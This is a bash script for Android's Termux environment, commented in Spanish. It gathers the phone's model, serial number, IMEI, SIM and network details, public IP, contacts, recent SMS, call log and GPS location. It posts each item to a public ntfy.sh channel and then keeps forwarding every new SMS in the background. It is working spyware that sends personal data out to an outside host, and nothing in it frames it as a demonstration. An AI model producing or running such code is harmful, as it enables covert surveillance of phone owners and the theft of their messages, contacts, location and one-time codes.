
#!/data/data/com.termux/files/usr/bin/bash

# === CONFIGURACIÓN ===
NTFY_URL="https://ntfy.sh/3kG4epWMkei6KLLq"  # tu canal NTFY público
INTERVALO=3600  # Intervalo en segundos (1 hora)
LOGFILE="/dev/null"
SMS_LAST_ID_FILE="$HOME/.ultimo_sms_id"

# === FUNCIÓN PARA ENVIAR MENSAJES ===
enviar_ntfy() {
    curl -s -d "$1" "$NTFY_URL" > $LOGFILE 2>&1
}

# === FUNCIÓN PRINCIPAL ===
recopilar_datos() {
    # 1. Info del dispositivo
    IP=$(curl -s ifconfig.me)
    BAT=$(termux-battery-status | jq -c '.' 2>/dev/null)
    MODEL=$(getprop ro.product.model)
    SERIAL=$(getprop ro.serialno)
    SIMINFO=$(termux-telephony-siminfo 2>/dev/null | jq -c '.')
    DEVICEINFO=$(termux-telephony-deviceinfo 2>/dev/null | jq -c '.')

    IMEI=$(echo "$DEVICEINFO" | jq -r '.device_id')

    enviar_ntfy "📱 Modelo: $MODEL"
    enviar_ntfy "🔑 Serial: $SERIAL"
    [ "$IMEI" != "null" ] && enviar_ntfy "🔐 IMEI: $IMEI"
    [ -n "$BAT" ] && enviar_ntfy "🔋 Batería: $BAT"
    [ -n "$IP" ] && enviar_ntfy "🌐 IP: $IP"
    [ -n "$SIMINFO" ] && enviar_ntfy "📶 SIM: $SIMINFO"
    [ -n "$DEVICEINFO" ] && enviar_ntfy "📡 Red: $DEVICEINFO"

    # 2. Contactos (solo 5)
    CONTACTOS=$(termux-contact-list 2>/dev/null)
    if [ -n "$CONTACTOS" ]; then
        echo "$CONTACTOS" | jq -c '.[0:5][]' | while read -r contacto; do
            enviar_ntfy "👤 Contacto: $contacto"
            sleep 1
        done
    fi

    # 3. Últimos SMS (3)
    SMS=$(termux-sms-list -l 3 2>/dev/null)
    if [ -n "$SMS" ]; then
        echo "$SMS" | jq -c '.[]' | while read -r sms; do
            enviar_ntfy "📩 SMS: $sms"
            sleep 1
        done
    fi

    # 4. Llamadas recientes (5)
    CALLS=$(termux-call-log -l 5 2>/dev/null)
    if [ -n "$CALLS" ]; then
        echo "$CALLS" | jq -c '.[]' | while read -r call; do
            enviar_ntfy "📞 Llamada: $call"
            sleep 1
        done
    fi

    # 5. Ubicación
    ubicacion=$(termux-location -p gps -r once 2>/dev/null)
    if [ -n "$ubicacion" ]; then
        LAT=$(echo "$ubicacion" | jq -r '.latitude')
        LON=$(echo "$ubicacion" | jq -r '.longitude')
        enviar_ntfy "📍 Ubicación: Latitud $LAT, Longitud $LON"
    fi
}

# === MONITOREO DE NUEVOS SMS ===
monitor_sms() {
    [ -f "$SMS_LAST_ID_FILE" ] || echo "0" > "$SMS_LAST_ID_FILE"
    
    while true; do
        ULTIMO_SMS=$(termux-sms-list -l 1 2>/dev/null | jq -c '.[0]')
        if [ -n "$ULTIMO_SMS" ]; then
            CURRENT_ID=$(echo "$ULTIMO_SMS" | jq -r '._id')
            LAST_ID=$(cat "$SMS_LAST_ID_FILE")
            if [ "$CURRENT_ID" != "$LAST_ID" ] && [ "$CURRENT_ID" != "null" ]; then
                enviar_ntfy "📩 NUEVO SMS: $ULTIMO_SMS"
                echo "$CURRENT_ID" > "$SMS_LAST_ID_FILE"
            fi
        fi
        sleep 1 # cada 30 segundos
    done
}

# === EJECUCIÓN EN SEGUNDO PLANO ===
recopilar_datos &
monitor_sms &
